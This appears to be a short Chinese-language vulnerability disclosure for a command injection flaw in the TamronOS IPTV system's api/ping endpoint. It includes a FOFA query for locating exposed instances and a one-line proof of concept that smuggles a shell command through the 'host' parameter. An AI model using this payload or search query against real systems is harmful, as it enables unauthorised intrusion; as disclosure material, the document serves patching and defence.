# TamronOS-IPTV系统-ping-任意命令执行漏洞

## 漏洞描述

TamronOS IPTV系统 api/ping 存在任意命令执行漏洞，攻击者通过漏洞可以执行任意命令

## 漏洞影响

> [!NOTE]
>
> TamronOS IPTV系统

## FOFA

> [!NOTE]
>
> app="TamronOS-IPTV系统"

## 漏洞复现

登录页面如下

![image-20210615145308242](TamronOS-IPTV系统-ping-任意命令执行漏洞.assets/1627363143995221.jpg)

漏洞POC为

```
/api/ping?count=5&host=;id;
```

![image-20210615145342322](TamronOS-IPTV系统-ping-任意命令执行漏洞.assets/1627363144225502.jpg)